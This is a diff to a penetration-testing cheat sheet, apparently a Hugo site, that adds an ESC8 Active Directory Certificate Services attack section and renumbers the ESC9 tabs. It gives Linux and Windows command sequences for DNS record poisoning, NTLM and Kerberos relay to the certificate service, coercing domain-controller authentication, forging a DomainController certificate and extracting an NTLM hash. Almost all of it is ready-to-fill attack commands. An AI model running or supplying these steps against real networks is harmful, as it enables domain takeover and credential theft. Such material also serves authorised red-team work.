@@ -423,10 +423,95 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 ---
 
-### ESC9
+### ESC8
 
 {{< tab set9 tab1 >}}Linux{{< /tab >}}
+{{< tab set9 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set9 tab1 >}}
+
+#### 1. DNS Poisoning
+
+```console
+bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
+```
+
+#### 2. Setup NTLM Relay
+
+```console
+certipy-ad relay -target '<TARGET_URL>' -template DomainController
+```
+
+#### 3. Check Coerce Authentication Methods
+
+```console
+nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus
+```
+
+#### 4. Coerce Authentication
+
+```console
+nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=<METHOD>
+```
+
+#### 5. Get NTLM Hash
+
+```console
+certipy-ad auth -pfx <DC_HOSTNAME>.pfx -dc-ip <DC_IP>
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set9 tab2 >}}
+
+#### 1. Setup
+
+```console
++-------------------------------------------------+
+| 1. Join Domain                                  |
+| 2. Config DNS                                   |
+| 3. Config C:\Windows\System32\drivers\etc\hosts |
++-------------------------------------------------+
+```
+
+#### 2. Request a Ticket
+
+```console
+.\rubeus.exe asktgt /user:'<USER>' /password:'<PASSWORD>' /enctype:AES256 /domain:'<DOMAIN>' /dc:'<DC>' /ptt /nowrap
+```
+
+#### 3. Check
+
+```console
+klist
+```
+
+#### 4. RemoteKrbRelay
+
+```console
+.\RemoteKrbRelay.exe -adcs -template DomainController -victim <VICTIM> -target <TARGET> -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
+```
+
+#### 5. Convert Base64 Encoded Cert to p12
+
+```console
+cat cert_b64 | base64 -d > cert.p12
+```
+
+#### 6. Get NTLM Hash
+
+```console
+certipy-ad auth -pfx cert.p12 -domain <DOMAIN> -dc-ip <DC_IP>
+```
+
+<small>*Ref: [RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay)*</small>
+
+{{< /tabcontent >}}
+
+---
+
+### ESC9
+
+{{< tab set10 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set10 tab1 >}}
 
 #### 1. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)
 
@@ -440,7 +525,7 @@ certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -us
 certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn Administrator
 ```
 
-#### 2. Request a Cert of Targer User
+#### 2. Request a Cert of Target User
 
 ```console
 # Password
@@ -492,9 +577,9 @@ certipy-ad cert -pfx '<USER>.pfx' -nocert -out '<USER>.key'
 certipy-ad cert -pfx '<USER>.pfx' -nokey -out '<USER>.crt'
 ```
 
-{{< tab set10 tab1 >}}LDAP Shell{{< /tab >}}
-{{< tab set10 tab2 >}}RBCD{{< /tab >}}
-{{< tabcontent set10 tab1 >}}
+{{< tab set11 tab1 >}}LDAP Shell{{< /tab >}}
+{{< tab set11 tab2 >}}RBCD{{< /tab >}}
+{{< tabcontent set11 tab1 >}}
 
 #### 1. Get a LDAP Shell
 
